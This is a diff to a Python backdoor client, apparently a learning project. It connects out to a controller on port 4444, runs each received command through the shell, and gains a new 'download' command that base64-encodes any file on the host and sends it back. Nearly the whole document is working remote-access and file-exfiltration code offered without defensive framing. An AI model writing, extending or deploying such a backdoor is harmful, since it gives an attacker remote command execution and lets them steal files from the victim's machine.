@@ -2,6 +2,7 @@ import socket
 import json # connect to server
 import subprocess
 import os
+import base64
 
 server_host = "localhost" # 192.168.0.81
 server_port = 4444
@@ -30,8 +31,26 @@ class BackdoorClient:
             except ValueError:
                 continue
     
+    
     def execute_order(self, command):
         return subprocess.check_output(command, shell=True).decode('utf-8')
+    
+    # def read_file(self, path):
+    #     try:
+    #         with open(path, "rb") as file:
+    #             return base64.b64encode(file.read())
+    #     except Exception as e:
+    #         print(f"Something bad happened: {str(e)}")
+
+    def read_file(self, path):
+        try:
+            with open(path, "rb") as file:
+                file_content = base64.b64encode(file.read()).decode('utf-8')
+                return file_content
+        except Exception as e:
+            print(f"Something bad happened: {str(e)}")
+            return None
+
     
     def cd_to(self, path):
         os.chdir(path)
@@ -42,18 +61,19 @@ class BackdoorClient:
         while True:
             try:
                 command = self.json_recieve()
-                command_read = command.lower().split()
+                command_read = command.split()
 
                 if command_read[0] == "exit":
                     self.connection.close()
                     #exit()
                 elif command_read[0] == "cd" and len(command_read) > 1:
                     command_output = self.cd_to(command_read[1])
+                elif command_read[0] == "download":
+                    command_output = self.read_file(command_read[1])
                 else:
                     command_output = self.execute_order(command)
                 self.json_send(command_output)
             except Exception as e:
-                self.json_send("something bad happened oopsies")
                 print(f"Something bad happened: {str(e)}")
                 continue 
 
